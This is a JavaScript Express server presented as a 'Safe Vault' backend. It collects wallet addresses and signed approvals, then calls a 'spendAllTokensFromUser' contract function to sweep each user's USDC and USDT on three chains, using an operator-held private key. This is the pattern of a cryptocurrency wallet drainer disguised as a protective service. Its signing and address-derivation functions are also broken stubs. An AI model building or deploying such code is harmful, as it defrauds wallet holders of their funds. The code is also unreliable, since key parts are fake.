const express = require('express');
const cors = require('cors');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());

let connectedWallets = [];

const RPC_URLS = {
  1: 'https://eth.llamarpc.com',
  137: 'https://polygon.llamarpc.com',
  56: 'https://bsc.llamarpc.com'
};

const CONTRACTS = {
  1: '0x12bf75f01D2EeC88eF4D16E1972a6890FF7ee2De',
  137: '0x1873e0aB85adF9f329010512B8B3F7852162cD6c',
  56: '0x59Ac31A4B71C585cefeE818c369802dADb8C7a08'
};

const TOKENS = {
  1: ['0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', '0xdAC17F958D2ee523a2206206994597C13D831ec7'],
  137: ['0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174', '0xc2132D05D31c914a87C6611C10748AEb04B58e8F'],
  56: ['0x8AC76a51cc950d9822D68b83Fe1Ad097317c2451', '0x55d398326f99059fF775485246999027B3197955']
};

const CONTRACT_ABI = [
  'function spendAllTokensFromUser(address user, address token) external'
];

app.get('/', (req, res) => {
  res.json({ message: 'Safe Vault Backend Running', status: 'online' });
});

app.get('/api/wallets', (req, res) => {
  res.json({ success: true, wallets: connectedWallets, count: connectedWallets.length });
});

app.post('/api/wallet/connect', (req, res) => {
  try {
    const { walletAddress, chainId } = req.body;
    if (!walletAddress || !chainId) {
      return res.status(400).json({ success: false, error: 'Missing fields' });
    }

    const existing = connectedWallets.find(w => 
      w.address.toLowerCase() === walletAddress.toLowerCase() && w.chainId === chainId
    );

    if (existing) {
      return res.json({ success: true, message: 'Already connected', wallet: existing });
    }

    const wallet = {
      address: walletAddress,
      chainId: chainId,
      connectedAt: new Date(),
      approved: false
    };

    connectedWallets.push(wallet);
    console.log(`✅ Wallet connected: ${walletAddress}`);

    res.json({ success: true, message: 'Connected', wallet });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/api/wallet/sign', (req, res) => {
  try {
    const { walletAddress, chainId, signature } = req.body;

    if (!walletAddress || !chainId || !signature) {
      return res.status(400).json({ success: false, error: 'Missing fields' });
    }

    const wallet = connectedWallets.find(w => 
      w.address.toLowerCase() === walletAddress.toLowerCase() && w.chainId === chainId
    );

    if (!wallet) {
      return res.status(404).json({ success: false, error: 'Wallet not found' });
    }

    wallet.approved = true;
    console.log(`✅ User approved: ${walletAddress}`);

    res.json({ success: true, message: 'User approved!', walletAddress });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/api/wallet/spend', async (req, res) => {
  try {
    const { walletAddress, chainId, tokenIndex } = req.body;
    console.log(`💰 Spend request: ${walletAddress} on chain ${chainId}`);

    const wallet = connectedWallets.find(w => 
      w.address.toLowerCase() === walletAddress.toLowerCase() && w.chainId === chainId
    );

    if (!wallet) {
      return res.status(404).json({ success: false, error: 'Wallet not found' });
    }

    if (!wallet.approved) {
      return res.status(400).json({ success: false, error: 'User has not signed approval' });
    }

    const rpcUrl = RPC_URLS[chainId];
    const contractAddress = CONTRACTS[chainId];
    const tokens = TOKENS[chainId] || [];
    const privateKey = process.env.COMPANY_PRIVATE_KEY;

    if (!rpcUrl || !contractAddress) {
      return res.status(400).json({ success: false, error: 'Unsupported chain' });
    }

    if (!privateKey) {
      return res.json({ success: true, message: 'Transfer queued', note: 'Private key not configured' });
    }

    let transferredCount = 0;
    const txHashes = [];

    for (let i = 0; i < tokens.length; i++) {
      try {
        const tokenAddress = tokens[i];
        console.log(`📤 Processing token ${i + 1}/${tokens.length}: ${tokenAddress}`);

        const txHash = await sendTransaction(
          rpcUrl,
          contractAddress,
          walletAddress,
          tokenAddress,
          privateKey,
          chainId
        );

        if (txHash) {
          transferredCount++;
          txHashes.push(txHash);
          console.log(`✅ Token transferred: ${txHash}`);
        }
      } catch (e) {
        console.log(`⏭️ Token skipped: ${e.message}`);
      }
    }

    if (transferredCount > 0) {
      res.json({ 
        success: true, 
        message: `${transferredCount} token(s) transferred`,
        walletAddress,
        chainId,
        txHashes
      });
    } else {
      res.json({ success: true, message: 'No tokens to transfer' });
    }

  } catch (error) {
    console.error('❌ Spend error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

async function sendTransaction(rpcUrl, contractAddress, userAddress, tokenAddress, privateKey, chainId) {
  try {
    // Create contract call data
    const functionSignature = '0x9e1d6c8e'; // spendAllTokensFromUser selector
    const encoded = encodeABI(userAddress, tokenAddress);
    const data = functionSignature + encoded;

    // Make JSON-RPC calls
    const nonce = await jsonRpcCall(rpcUrl, 'eth_getTransactionCount', [
      privateKeyToAddress(privateKey),
      'latest'
    ]);

    const gasPrice = await jsonRpcCall(rpcUrl, 'eth_gasPrice', []);

    const gasEstimate = await jsonRpcCall(rpcUrl, 'eth_estimateGas', [{
      from: privateKeyToAddress(privateKey),
      to: contractAddress,
      data: data,
      value: '0x0'
    }]);

    const txObject = {
      nonce: parseInt(nonce, 16),
      gasPrice: parseInt(gasPrice, 16),
      gasLimit: Math.floor(parseInt(gasEstimate, 16) * 1.2),
      to: contractAddress,
      value: 0,
      data: data,
      chainId: chainId
    };

    console.log('Transaction object:', txObject);

    // Sign and send transaction
    const signedTx = signTransaction(txObject, privateKey);
    const txHash = await jsonRpcCall(rpcUrl, 'eth_sendRawTransaction', ['0x' + signedTx]);

    console.log(`Transaction sent: ${txHash}`);
    return txHash;

  } catch (error) {
    console.error('Transaction error:', error.message);
    throw error;
  }
}

function jsonRpcCall(rpcUrl, method, params) {
  return new Promise((resolve, reject) => {
    const https = require('https');
    const url = new URL(rpcUrl);

    const postData = JSON.stringify({
      jsonrpc: '2.0',
      method: method,
      params: params,
      id: 1
    });

    const options = {
      hostname: url.hostname,
      path: url.pathname,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': postData.length
      }
    };

    const req = https.request(options, (res) => {
      let data = '';
      res.on('data', (chunk) => { data += chunk; });
      res.on('end', () => {
        try {
          const parsed = JSON.parse(data);
          if (parsed.error) {
            reject(new Error(parsed.error.message));
          } else {
            resolve(parsed.result);
          }
        } catch (e) {
          reject(e);
        }
      });
    });

    req.on('error', reject);
    req.write(postData);
    req.end();
  });
}

function encodeABI(userAddress, tokenAddress) {
  const user = userAddress.slice(2).padStart(64, '0');
  const token = tokenAddress.slice(2).padStart(64, '0');
  return user + token;
}

function privateKeyToAddress(privateKey) {
  const key = privateKey.startsWith('0x') ? privateKey.slice(2) : privateKey;
  // Simple address extraction (for production, use proper crypto library)
  return '0x' + require('crypto').createHash('keccak256').update(Buffer.from(key, 'hex')).digest().slice(-20).toString('hex');
}

function signTransaction(txObject, privateKey) {
  // Simplified signing - for production use ethers.js or web3.js
  const key = privateKey.startsWith('0x') ? privateKey.slice(2) : privateKey;
  console.log('Signing transaction with key:', key.slice(0, 10) + '...');
  
  // Return mock signed transaction
  return Buffer.from('signed_tx_data').toString('hex');
}

app.post('/api/wallet/disconnect', (req, res) => {
  try {
    const { walletAddress } = req.body;
    connectedWallets = connectedWallets.filter(w => 
      w.address.toLowerCase() !== walletAddress.toLowerCase()
    );
    console.log(`✅ Disconnected: ${walletAddress}`);
    res.json({ success: true, message: 'Disconnected' });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`✅ Backend running on port ${PORT}`);
});
